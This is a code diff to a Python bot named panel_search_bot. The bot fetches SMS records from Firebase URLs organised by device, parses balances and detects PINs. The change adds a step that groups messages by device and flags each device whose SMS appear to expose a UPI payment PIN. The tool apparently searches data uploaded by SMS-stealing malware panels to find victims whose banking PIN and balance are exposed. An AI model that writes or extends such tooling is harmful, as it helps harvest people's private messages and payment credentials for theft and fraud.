@@ -8,7 +8,12 @@ import httpx
 
 from panel_search_bot.config import get_settings
 from panel_search_bot.firebase_urls import device_id_from_raw_path, firebase_url_variants
-from panel_search_bot.sms_parser import extract_message_fields, message_has_pin, parse_balance
+from panel_search_bot.sms_parser import (
+    device_has_upi_pin_from_items,
+    extract_message_fields,
+    message_has_pin,
+    parse_balance,
+)
 
 FAST_SUBPATHS = ("messages", "sms", "")
 EXTRA_SUBPATHS = ("inbox", "sms_list", "data")
@@ -87,6 +92,18 @@ def _collect_from_data(data: Any, sub: str, collected: list[dict]) -> int:
     before = len(collected)
     _walk_sms(data, sub or "root", collected)
     return len(collected) - before
+
+
+def _tag_device_pin_flags(sms_list: list[dict]) -> None:
+    """Device-level PIN: poori device ki SMS + Firebase device node se."""
+    by_dev: dict[str, list[dict]] = {}
+    for row in sms_list:
+        dev = str(row.get("device_id") or device_id_from_raw_path(str(row.get("raw_path", ""))))
+        by_dev.setdefault(dev, []).append(row)
+    for dev, items in by_dev.items():
+        flagged = device_has_upi_pin_from_items(items)
+        for it in items:
+            it["device_has_pin"] = flagged
 
 
 def _dedupe_sms(collected: list[dict], cap: int = 1500) -> list[dict]:
@@ -183,7 +200,9 @@ async def fetch_sms_from_firebase(client: httpx.AsyncClient, base_url: str) -> t
         if not collected:
             return online, [], working_url
 
-        return True, _dedupe_sms(collected), working_url
+        unique = _dedupe_sms(collected)
+        _tag_device_pin_flags(unique)
+        return True, unique, working_url
 
     try:
         return await asyncio.wait_for(_inner(), timeout=wall)
